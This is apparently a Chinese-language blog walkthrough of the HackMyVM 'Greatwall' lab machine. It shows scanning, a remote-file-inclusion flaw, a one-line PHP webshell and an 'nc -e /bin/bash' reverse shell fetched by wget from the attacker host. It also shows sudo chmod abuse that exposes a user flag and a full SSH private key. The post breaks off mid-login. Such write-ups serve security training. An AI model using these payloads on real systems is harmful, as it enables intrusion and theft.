---
title: Greatwall
author: hgbe02
date: 2025-06-19 01:00:26 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web,pentest,clash]  
permalink: "/Hackmyvm/Greatwall.html"
---

# Greatwall

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103364.png" alt="image-20250617231952169" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103366.png" alt="image-20250618075004317" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ nmap -sT -T4 -sC -sV $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 19:52 EDT
Nmap scan report for 192.168.10.129
Host is up (0.00099s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:8c:5a:5a:8b:43:a1:27:81:13:ff:b6:be:b5:c6:e5 (ECDSA)
|_  256 e4:73:84:da:df:18:e2:f2:db:5e:11:93:b5:d9:54:74 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Hello World
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 00:0C:29:A5:9B:0B (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds
```

### 目录扫描

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ dirsearch -u http://192.168.10.129/ 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                 
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/temp/Greatwall/reports/http_192.168.10.129/__25-06-17_20-02-58.txt

Target: http://192.168.10.129/

[20:02:58] Starting:                                                                                                                                                                                    
[20:02:59] 403 -  279B  - /.ht_wsr.txt                                      
[20:02:59] 403 -  279B  - /.htaccess.orig                                   
[20:02:59] 403 -  279B  - /.htaccess.sample
[20:02:59] 403 -  279B  - /.htaccess.save
[20:02:59] 403 -  279B  - /.htaccess_extra                                  
[20:02:59] 403 -  279B  - /.htaccess_sc                                     
[20:02:59] 403 -  279B  - /.htaccess.bak1                                   
[20:02:59] 403 -  279B  - /.htaccessBAK
[20:02:59] 403 -  279B  - /.htaccess_orig
[20:02:59] 403 -  279B  - /.htaccessOLD
[20:02:59] 403 -  279B  - /.htaccessOLD2
[20:03:00] 403 -  279B  - /.htm                                             
[20:03:00] 403 -  279B  - /.html                                            
[20:03:00] 403 -  279B  - /.htpasswd_test                                   
[20:03:00] 403 -  279B  - /.htpasswds
[20:03:00] 403 -  279B  - /.httr-oauth
[20:03:00] 403 -  279B  - /.php                                             
[20:03:11] 404 -   16B  - /composer.phar                                    
[20:03:22] 404 -   16B  - /php-cs-fixer.phar                                
[20:03:23] 404 -   16B  - /phpunit.phar                                     
[20:03:26] 403 -  279B  - /server-status                                    
[20:03:26] 403 -  279B  - /server-status/

┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ gobuster dir -u http://192.168.10.129/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.129/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 3193]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================

```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103367.png" alt="image-20250618080024126" style="zoom:50%;" />

查看源代码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103368.png" alt="image-20250618080049456" style="zoom:50%;" />

可以看到是`GET`传参，尝试看一下：

```bash
http://192.168.10.129/?page=https%3A%2F%2Fwww.baidu.com
```

### RFI(试错)

尝试进行本地文件包含：

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ curl -s "http://192.168.10.129/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd" | html2text
Across the Great Wall we can reach every corner in the world
[page                ]
nonono~

```

可能有过滤，尝试编码字符再尝试：

```bash
# php://filter/convert.base64-encode/resource=../../../../../etc/passwd
# php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3D%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ curl -s "http://192.168.10.129/index.php?page=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3D%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd" | html2text
Across the Great Wall we can reach every corner in the world
[page                ]
nonono~
```

难道是RFI？尝试一下：

```bash
# http://192.168.10.128:8888/revshell.php
http://192.168.10.129/?page=http%3A%2F%2F192%2E168%2E10%2E128%3A8888%2Frevshell%2Ephp
```

然后就开始加载，过了一会并未发现shell有请求发过来，下面的请求是我主机进行测试的结果：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103369.png" alt="image-20250618081831592" style="zoom:50%;" />

尝试进行定位文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103370.png" alt="image-20250618083130745" style="zoom:50%;" />

```bash
http://192.168.10.129/?page=http%3A%2F%2F127.0.0.1%2Findex.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103371.png" alt="image-20250618090102104" style="zoom:50%;" />

发现应该是可以包含本地文件并解析的。。。。尝试进行上传文件，但是就是请求不到，不知道啥情况，难道允许 put 上传？

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ rustscan -a 192.168.10.129 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
You miss 100% of the ports you don't scan. - RustScan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.129:22
Open 192.168.10.129:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:8c:5a:5a:8b:43:a1:27:81:13:ff:b6:be:b5:c6:e5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKRu5jciIdNNmfTqr0lMfefa78S29x6BomOO1L4LTfrFsfTOU1UWH6rMhYOO6/lwUi6D16FBbDL7I3RciwoyX8w=
|   256 e4:73:84:da:df:18:e2:f2:db:5e:11:93:b5:d9:54:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILXqxoPabwLw5VBYwTrRzVaoDU7Z1YHyzSNLVwV3v3xO
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Hello World
MAC Address: 00:0C:29:A5:9B:0B (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

发现也不能进行 put 上传，还是得尝试远程包含：

```bash
# http://192.168.10.129/?page=http://192.168.10.128:8888/shell.txt%00
http://192.168.10.129/?page=http%3A%2F%2F192%2E168%2E10%2E128%3A8888%2Fshell%2Etxt
# nonono~
http://192.168.10.129/?page=http%253A%252F%252F192%252E168%252E10%252E128%253A8888%252Fshell%252Etxt
# nonono~
```

都不行，突然让我想起了`boxing`那个靶机，尝试一下basic认证：

```bash
http://192.168.10.129/?page=http://127.0.0.1:kali@192.168.10.128:8888/revshell.php
```

但是也不行欸。。。。然后就是慢慢尝试，直到我把端口改为了`80`.。。。。。。。。

```bash
http://192.168.10.129/?page=http://192.168.10.128/shell.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103372.png" alt="image-20250618102657838" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103373.png" alt="image-20250618102639349" style="zoom:50%;" />

尝试本地包含进行反弹：

```bash
http://192.168.10.129/?page=http://127.0.0.1/shell.php
```

但是发现不行欸。。。。研究下报错：

```bash
WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110)
```

尝试关闭防火墙。。。。。但是仍然不行。。。。。尝试修改文件后缀上传，发现也不行。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103374.png" alt="image-20250618111720468" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103375.png" alt="image-20250618111732718" style="zoom:50%;" />

想起之前不知道是限制了开放端口还是长度失败了，所以这里改为一句话shell试试：

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ cat webshell.php 
<?php system($_GET["cmd"]) ;?>
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103376.png" alt="image-20250618134757669" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103377.png" alt="image-20250618134807084" style="zoom:50%;" />

发现没有报错了，但是还是读取不到，改为`GIF89a`和`.jpg`后缀有了新的回显：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103378.png" alt="image-20250618135855405" style="zoom:50%;" />

尝试看一下是否上传成功了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103379.png" alt="image-20250618135938520" style="zoom:33%;" />

成功执行命令，尝试进行命令执行反弹shell：

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ chmod +x revshell.sh 
                                                                             
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ head revshell.sh 
nc -e /bin/bash 192.168.10.128 1234
                                                                             
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ ls -la revshell.
ls: cannot access 'revshell.': No such file or directory
                                                                             
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ ls -la revshell.sh 
-rwxrwxr-x 1 kali kali 36 Jun 18 02:11 revshell.sh

http://192.168.10.129/?page=http://192.168.10.128/webshell.jpg&cmd=wget http://192.168.10.128/revshell.sh -O /tmp/revshell.sh
http://192.168.10.129/?page=http://192.168.10.128/webshell.jpg&cmd=ls -la /tmp/revshell.sh
# -rw-r--r-- 1 www-data www-data 36 Jun 18 14:11 /tmp/revshell.sh
# 无法修改权限。。。。。
```

看一下文件吧：

```bash
http://192.168.10.129/?page=http://192.168.10.128/webshell.jpg&cmd=cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
wall:x:1000:1000:wall,,,:/home/wall:/bin/bash
```

还是老老实实看源代码吧：

```bash
http://192.168.10.129/?page=http://192.168.10.128/webshell.jpg&cmd=cat index.php
```

```php
<?php
if (isset($_GET['page'])) {
$page = $_GET['page'];

if (!preg_match('/^(file|https?):\/\//i', $page)) {
echo 'nonono~';
return;
}

if (preg_match('/^https?:\/\/(www\.)?google\.com\/?$/i', $page)) {
echo 'gulugulu~';
return;
}

@include($page);
}
?>
```

- 要求字符串**开头**必须是 `file://`、`http://` 或 `https://`
- 屏蔽了特定域名
- 文件包含

尝试进行利用：

```
http://192.168.10.129/?page=file:///etc/passwd
```

成功回显。。。所以我一直在和空气斗智斗勇？？？？

### FUZZ

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ ffuf -c -u "http://192.168.10.129/?page=file://FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 1235 2>/dev/null 
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 4250, Words: 1239, Lines: 134, Duration: 12ms]
/etc/apt/sources.list   [Status: 200, Size: 3569, Words: 1261, Lines: 116, Duration: 3ms]
/etc/fstab              [Status: 200, Size: 3999, Words: 1414, Lines: 127, Duration: 4ms]
/etc/apache2/apache2.conf [Status: 200, Size: 10371, Words: 2169, Lines: 337, Duration: 3ms]
/etc/crontab            [Status: 200, Size: 4235, Words: 1411, Lines: 134, Duration: 3ms]
/etc/hosts.allow        [Status: 200, Size: 3604, Words: 1316, Lines: 122, Duration: 13ms]
/etc/hosts              [Status: 200, Size: 3382, Words: 1253, Lines: 119, Duration: 17ms]
/etc/hosts.deny         [Status: 200, Size: 3904, Words: 1362, Lines: 129, Duration: 28ms]
/etc/nsswitch.conf      [Status: 200, Size: 3687, Words: 1363, Lines: 132, Duration: 3ms]
/etc/netconfig          [Status: 200, Size: 3960, Words: 1523, Lines: 131, Duration: 4ms]
/etc/passwd             [Status: 200, Size: 4250, Words: 1239, Lines: 134, Duration: 1ms]
/./././././././././././etc/passwd [Status: 200, Size: 4250, Words: 1239, Lines: 134, Duration: 3ms]
/etc/issue              [Status: 200, Size: 3220, Words: 1239, Lines: 114, Duration: 3ms]
/../../../../../../../../../../etc/passwd [Status: 200, Size: 4250, Words: 1239, Lines: 134, Duration: 2ms]
/etc/init.d/apache2     [Status: 200, Size: 11332, Words: 2727, Lines: 465, Duration: 4ms]
/etc/resolv.conf        [Status: 200, Size: 3255, Words: 1238, Lines: 115, Duration: 2ms]
/etc/rpc                [Status: 200, Size: 4104, Words: 1271, Lines: 153, Duration: 1ms]
/etc/ssh/sshd_config    [Status: 200, Size: 6401, Words: 1521, Lines: 234, Duration: 3ms]
/proc/net/route         [Status: 200, Size: 3577, Words: 1449, Lines: 115, Duration: 4ms]
/proc/net/tcp           [Status: 200, Size: 3493, Words: 1358, Lines: 114, Duration: 6ms]
/proc/interrupts        [Status: 200, Size: 8774, Words: 4490, Lines: 178, Duration: 5ms]
/proc/loadavg           [Status: 200, Size: 3219, Words: 1239, Lines: 113, Duration: 6ms]
/proc/net/dev           [Status: 200, Size: 3639, Words: 1485, Lines: 116, Duration: 6ms]
/proc/mounts            [Status: 200, Size: 5074, Words: 1355, Lines: 136, Duration: 6ms]
/proc/meminfo           [Status: 200, Size: 4696, Words: 1774, Lines: 166, Duration: 4ms]
/proc/partitions        [Status: 200, Size: 3340, Words: 1309, Lines: 118, Duration: 2ms]
/proc/net/arp           [Status: 200, Size: 3503, Words: 1380, Lines: 116, Duration: 4ms]
/proc/self/cmdline      [Status: 200, Size: 3271, Words: 1237, Lines: 112, Duration: 1ms]
/proc/cpuinfo           [Status: 200, Size: 7869, Words: 1803, Lines: 220, Duration: 5ms]
/proc/version           [Status: 200, Size: 3382, Words: 1255, Lines: 113, Duration: 5ms]
/proc/self/status       [Status: 200, Size: 4616, Words: 1326, Lines: 169, Duration: 5ms]
/var/log/lastlog        [Status: 200, Size: 295485, Words: 1236, Lines: 112, Duration: 2ms]
/var/log/wtmp           [Status: 200, Size: 90745, Words: 1301, Lines: 174, Duration: 8ms]
///////../../../etc/passwd [Status: 200, Size: 4250, Words: 1239, Lines: 134, Duration: 5ms]
```

查了一些没发现痕迹，

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103380.png" alt="image-20250618151718927" style="zoom:50%;" />

尝试各种反弹shell都没用。。。。猜测可能是因为请求的是外部文件，无法对本地环境进行修改，尝试下载反弹shell到网站目录再进行访问：

> 中间重新配置了一下vmware虚拟网络，故IP发生了一点变化：

```bash
# http://192.168.182.129/?page=http://192.168.182.128/webshell.jpg&cmd=id
http://192.168.182.129/?page=http://192.168.182.128/webshell.jpg&cmd=wget http://192.168.182.128/revshell.php -O /var/www/html/revshell.php
http://192.168.182.129/?page=http://192.168.182.128/webshell.jpg&cmd=pwd
# total 12
# drwxr-xr-x 2 root root 4096 May 11 02:07 .
# drwxr-xr-x 3 root root 4096 May 10 19:18 ..
# -rw-r--r-- 1 root root 3646 May 11 02:07 index.php
```

发现没有写的权限，尝试换一个目录试试。。。。

```bash
http://192.168.182.129/?page=http://192.168.182.128/webshell.jpg&cmd=wget http://192.168.182.128/revshell.php -O /var/tmp/revshell.php
http://192.168.182.129/?page=http://192.168.182.128/webshell.jpg&cmd=ls -la /var/tmp/revshell.php
# total 20
# drwxrwxrwt  4 root     root     4096 Jun 18 22:44 .
# drwxr-xr-x 12 root     root     4096 May 10 19:18 ..
# -rw-r--r--  1 www-data www-data 3913 Jun 18 22:36 revshell.php
# drwx------  3 root     root     4096 Jun 18 22:32 systemd-private-5fdfb580855d4b458ba6ce1501508a88-apache2.service-LJlBee
# drwx------  3 root     root     4096 Jun 18 22:32 systemd-private-5fdfb580855d4b458ba6ce1501508a88-systemd-logind.service-7k7Q7J
```

> `drwxrwxrwt`的t：仅当作用于目录时有效。**即使其他用户有写权限（`w`），也只能删除自己创建的文件/目录**，无法删除其他用户的文件（需所有者或 `root` 才能删除）若同时有 `x`（执行权限），显示为小写 `t`（如 `rwt`）；若无 `x` 权限，显示为大写 `T`（如 `rwT`），此时粘滞位无效

说明拥有执行权限。。。。

然后我翻了一下[城南的wp](https://pepster.me/MazeSec-GreatWall-Walkthrough/)，发现设置了`iptables`，不允许流量出站，其实很早就有相关的现象，比如前面的执行命令了，但并未反弹，以及我一开始以为的长度过长导致无法远程包含的现象，我居然一直视而不见。。。。。值得反思。。。

### iptables流量不出站

一些之前应该做的但是我漏掉的在这里进行一定的记录：

```bash
┌──(kali㉿kali)-[~/temp/Greatwall]
└─$ echo '<?php phpinfo();?>' > phpinfo.php 
# http://192.168.182.129/?page=http://192.168.182.128/phpinfo.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103381.png" alt="image-20250618234001639" style="zoom:50%;" />

允许包含。。。只需要将反弹shell的端口设置为`80`即可，我有过猜想但终归没有付诸实践。。。

```bash
http://192.168.182.129/?page=http://192.168.182.128/revshell.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506190103382.png" alt="image-20250618234239548" style="zoom:50%;" />

反弹过来了。。。。。

## 提权

### 稳定shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
# stty size
stty raw -echo; fg
stty rows 50 columns 200
```

### sudo chmod读取私钥

具体不会可以参考：https://gtfobins.github.io/gtfobins/chmod/#sudo

总之就是遇到啥就干掉啥就好了，记得恢复权限，不然 ssh 无法正常进行登录。。。。

```bash
www-data@greatwall:/tmp$ cd ~
www-data@greatwall:~$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 10 19:18 .
drwxr-xr-x 12 root root 4096 May 10 19:18 ..
drwxr-xr-x  2 root root 4096 May 11 02:07 html
www-data@greatwall:~$ cd /home
www-data@greatwall:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 10 18:54 .
drwxr-xr-x 18 root root 4096 May 10 18:53 ..
drwx------  4 wall wall 4096 May 11 02:41 wall
www-data@greatwall:/home$ cd wall
bash: cd: wall: Permission denied
www-data@greatwall:/home$ sudo -l
Matching Defaults entries for www-data on greatwall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on greatwall:
    (wall) NOPASSWD: /bin/chmod
www-data@greatwall:/home$ sudo -u wall /bin/chmod 777 /home/wall/
www-data@greatwall:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 May 10 18:54 .
drwxr-xr-x 18 root root 4096 May 10 18:53 ..
drwxrwxrwx  4 wall wall 4096 May 11 02:41 wall
www-data@greatwall:/home$ cd wall
www-data@greatwall:/home/wall$ ls -la
total 32
drwxrwxrwx 4 wall wall 4096 May 11 02:41 .
drwxr-xr-x 3 root root 4096 May 10 18:54 ..
lrwxrwxrwx 1 root root    9 May 11 00:15 .bash_history -> /dev/null
-rwx------ 1 wall wall  220 May 10 18:54 .bash_logout
-rwx------ 1 wall wall 3526 May 10 18:54 .bashrc
drwx------ 3 wall wall 4096 May 11 00:18 .local
-rwx------ 1 wall wall  807 May 10 18:54 .profile
drwxr-xr-x 2 wall wall 4096 May 11 02:41 .ssh
-rwx------ 1 wall wall 1808 May 11 00:25 user.flag
www-data@greatwall:/home/wall$ sudo -u wall /bin/chmod 777 user.flag 
www-data@greatwall:/home/wall$ cat user.flag 
                                                          .'.      
                                                      .':ldd.      
                                                  .,:oddddd:       
                                              .,cdddddddddd        
                                          .,cddddddddddddd:        
                                      .;lddddddddddddddddd.        
                                  .;lddddddddddddddddddddl         
                              .,cddddddddddddccoddddddddd.         
                          .;cdddddddddddddl,.:ddddddddddc          
                     .';lddddddddddddddo;. ,dddddddddddd.          
                 .':lddddddddddddddddc.  'oddddddddddddc           
             .':odddddddddddddddddl,   .cdddddddddddddd.           
         .':oddddddddddddddddddd:.    ;dddddddddddddddo            
      ';lddddddddddddddddddddl,     'odddddddddddddddd'            
       ..,:lodddddddddddddo;.     .cdddddddddddddddddl             
             ..';codddddc.      .:ddddddddddddddddddd.             
                    ..'        ,ddddddddddddddddddddc              
                              ;ldddddddddddddddddddd.              
                                 ..';clddddddddddddc               
                                        ..,:loddddd.               
                             .c:,..           ..',:                
                             'ddddd'                               
                             'dddl.                                
                             ,dd,                                  
                             ;o.                                   
                             .                                     

flag{b088764475fa2a0a962fb9154f41c5b6}
www-data@greatwall:/home/wall$ cd .ssh
www-data@greatwall:/home/wall/.ssh$ ls -la
total 20
drwxr-xr-x 2 wall wall 4096 May 11 02:41 .
drwxrwxrwx 4 wall wall 4096 May 11 02:41 ..
-rw-r--r-- 1 wall wall  568 May 11 02:41 authorized_keys
-rw------- 1 wall wall 2602 May 11 02:41 id_rsa
-rw-r--r-- 1 wall wall  568 May 11 02:41 id_rsa.pub
www-data@greatwall:/home/wall/.ssh$ sudo -u wall /bin/chmod 777 id_rsa
www-data@greatwall:/home/wall/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
www-data@greatwall:/home/wall/.ssh$ sudo -u wall /bin/chmod 600 id_rsa
```

进行了报错，说明咱们这个办法不太阔以：

```bash
──(kali㉿kali)-[~/temp/Greatwall]
└─$ ssh wall@192.168.182.129 -i wall
The authenticity of host '192.168.182.129 (192.168.182.129)' can't be established.
ED25519 key fingerprint is SHA256:CJQF3wDS2rsdJ+TiNE7LaVsWzEUH2kK3rLthrBNtSqc.
This key is not known by any other names.
